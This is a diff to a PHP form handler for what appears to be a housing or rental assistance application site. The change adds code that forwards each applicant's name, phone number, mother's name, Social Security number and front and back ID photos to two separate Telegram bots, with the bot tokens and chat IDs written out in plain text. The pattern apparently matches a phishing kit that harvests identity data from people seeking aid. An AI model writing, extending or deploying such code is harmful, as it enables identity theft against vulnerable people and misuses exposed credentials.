@@ -81,25 +81,29 @@ $front_id, $back_id
 // ======================
 // TELEGRAM BOT SETUP
 // ======================
-// Telegram Bot 1
 $bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
 $chat1 = "6513265609";
 
-// Telegram Bot 2
 $bot2 = "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0";
 $chat2 = "5469294503";
 
-// 🔥 YOUR REAL RENDER URL
 $baseUrl = "https://homeandrentalassistance.onrender.com";
 
-// FIX: build correct file URLs
 $front_url = $baseUrl . "/" . $front_id;
 $back_url  = $baseUrl . "/" . $back_id;
 
-// ======================
-// SEND TEXT MESSAGE
-// ======================
 
+// ======================
+// FUNCTION
+// ======================
+function sendTelegram($bot, $chat, $url, $data) {
+    file_get_contents("https://api.telegram.org/bot$bot/$url?" . http_build_query($data));
+}
+
+
+// ======================
+// TEXT MESSAGE
+// ======================
 $text = "📄 New Application Submitted\n\n"
 . "👤 Name: $first_name $middle_name $last_name\n"
 . "📞 Phone: $phone\n"
@@ -111,34 +115,47 @@ $text = "📄 New Application Submitted\n\n"
 . "👩 Mother: $mother_name\n"
 . "🧾 SSN: $ssn";
 
-file_get_contents(
-    "https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
-        "chat_id" => $chatId,
-        "text" => $text
-    ])
-);
 
 // ======================
-// SEND FRONT ID IMAGE
+// SEND TO BOT 1
 // ======================
-file_get_contents(
-    "https://api.telegram.org/bot$botToken/sendPhoto?" . http_build_query([
-        "chat_id" => $chatId,
-        "photo" => $front_url,
-        "caption" => "🪪 Front ID - $first_name $last_name"
-    ])
-);
+sendTelegram($bot1, $chat1, "sendMessage", [
+    "chat_id" => $chat1,
+    "text" => $text
+]);
+
+sendTelegram($bot1, $chat1, "sendPhoto", [
+    "chat_id" => $chat1,
+    "photo" => $front_url,
+    "caption" => "🪪 Front ID - $first_name $last_name"
+]);
+
+sendTelegram($bot1, $chat1, "sendPhoto", [
+    "chat_id" => $chat1,
+    "photo" => $back_url,
+    "caption" => "🪪 Back ID - $first_name $last_name"
+]);
+
 
 // ======================
-// SEND BACK ID IMAGE
+// SEND TO BOT 2
 // ======================
-file_get_contents(
-    "https://api.telegram.org/bot$botToken/sendPhoto?" . http_build_query([
-        "chat_id" => $chatId,
-        "photo" => $back_url,
-        "caption" => "🪪 Back ID - $first_name $last_name"
-    ])
-);
+sendTelegram($bot2, $chat2, "sendMessage", [
+    "chat_id" => $chat2,
+    "text" => $text
+]);
+
+sendTelegram($bot2, $chat2, "sendPhoto", [
+    "chat_id" => $chat2,
+    "photo" => $front_url,
+    "caption" => "🪪 Front ID - $first_name $last_name"
+]);
+
+sendTelegram($bot2, $chat2, "sendPhoto", [
+    "chat_id" => $chat2,
+    "photo" => $back_url,
+    "caption" => "🪪 Back ID - $first_name $last_name"
+]);
 
 // ======================
 // EMAIL NOTIFICATION
